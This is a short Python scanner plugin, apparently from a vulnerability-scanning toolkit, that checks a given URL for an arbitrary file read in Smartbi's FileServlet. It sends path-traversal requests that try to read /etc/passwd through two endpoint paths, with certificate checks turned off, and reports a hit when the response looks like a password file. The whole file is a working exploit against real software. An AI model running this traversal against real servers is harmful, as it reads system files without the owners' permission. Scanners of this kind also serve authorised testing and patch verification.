#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Smartbi smartbi_bi 任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx'
  target2 = '/smartbi/vision/FileServlet?ftpType=out&path=upload/../../../../../../../../../../etc/passwd&name=f24e09e9-f970-7c61-dcf4-491b2ed7838c.docx'
  url1 = url + target
  url2 = url + target2
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['ifbug'] = True
      ret['url'] =url1
      res.close()
      return ret
  except:
    pass
  try:
    resp = requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if resp.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',resp.text,re.S):
      ret['ifbug'] = True
      ret['url'] =url2
      resp.close()
      return ret
    else:
      return ret
  except:
    return ret